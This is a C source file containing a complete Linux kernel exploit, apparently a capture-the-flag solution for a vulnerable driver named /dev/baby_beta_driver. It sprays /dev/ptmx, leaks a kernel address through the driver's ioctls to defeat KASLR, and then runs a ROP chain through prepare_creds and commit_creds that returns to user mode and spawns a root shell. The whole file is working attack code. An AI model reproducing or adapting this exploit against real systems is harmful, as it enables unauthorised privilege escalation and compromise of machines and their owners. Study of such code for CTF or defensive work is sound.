#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct req{
	int size;
	int padding;
	char *data;
}req;


unsigned long long user_cs;
unsigned long long user_ss;
unsigned long long user_sp;
unsigned long long user_rflags;

static void win(){
	printf("Your current creds are %d\n", geteuid());
	system("/bin/sh");
	//execve("/bin/sh",0,0);
}

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory");
}

int main(){
	int fd = open("/dev/baby_beta_driver",6);
	if(fd < 0){
		printf("Failed to open\n");
		exit(0);
	}

	int fds[50];
	for(int x = 0; x < 50; x++){
		fds[x] = open("/dev/ptmx",7);
	}

	for(int x = 0; x < 50; x++){
		close(fds[x]);
	}

	req a;

	a.size = 0x2d0;
	a.data = 0;

	ioctl(fd,0x1337c0de, &a);

	a.size = 0x30;
	a.data = malloc(0x200);

	ioctl(fd, 0xc0de1337, &a);

	for(int x = 0; x < 0x30; x+=8){
		printf("0x%llx\n", *(long long *)(a.data + x));
	}

	unsigned long long leak = *(long long *)(a.data + 0x18);

	unsigned long long base = leak - 0x623cc0;

	printf("Base is at 0x%llx\n", base);
	if(leak < 0xffffffff00000000){
		printf("Failed to leak base");
		exit(0);
	}


	unsigned long long rdi = 0x11a54d + base;
	unsigned long long rsi = base + 0x05c00;
	unsigned long long swapgs = base + 0x200d6c;
	unsigned long long iretq = base + 0x14db6; //xchg rax, rdi; call qword ptr [rsi];
	unsigned long long rax_rdi = base + 0x4d424;//: add rdi, rax; cmp qword ptr [rdi + 0x58], rsi; je 0x24d431; mov eax, r8d; ret;
	unsigned long long prepare_creds = base + 0x53bb0;
	unsigned long long commit_creds = base + 0x53d00;
	unsigned long long ret2um = base + 0x200cc6;

	int i = 0;
	unsigned long long *ropchain = (unsigned long long *)a.data;

	printf("0x%llx\n", rdi);
	printf("0x%llx\n", rax_rdi);
	printf("0x%llx\n", swapgs);
	printf("0x%llx\n", ret2um);
	
	save_state();
	ropchain[i++] = 0;
	ropchain[i++] = 0;
	ropchain[i++] = 0;
	ropchain[i++] = 0;
	ropchain[i++] = 0;
	ropchain[i++] = 0;
	ropchain[i++] = 0;
	ropchain[i++] = 0;

	
	ropchain[i++] = rdi;
	ropchain[i++] = 0;
	ropchain[i++] = prepare_creds;
	ropchain[i++] = rdi;
	ropchain[i++] = 0;

	ropchain[i++] = rax_rdi;
	ropchain[i++] = commit_creds;
	//ropchain[i++] = swapgs;
	//ropchain[i++] = 0;
	//ropchain[i++] = iretq;
	ropchain[i++] = ret2um;
	ropchain[i++] = 0;
	ropchain[i++] = 0;

	ropchain[i++] = (unsigned long long) win;
	ropchain[i++] = user_cs;
	ropchain[i++] = user_rflags;
	ropchain[i++] = user_sp;
	ropchain[i++] = user_ss;

	a.size = 0x100;

	ioctl(fd, 0x1337c0de, &a);

	ioctl(fd, 0xc0de1337, &a);





	
		


}
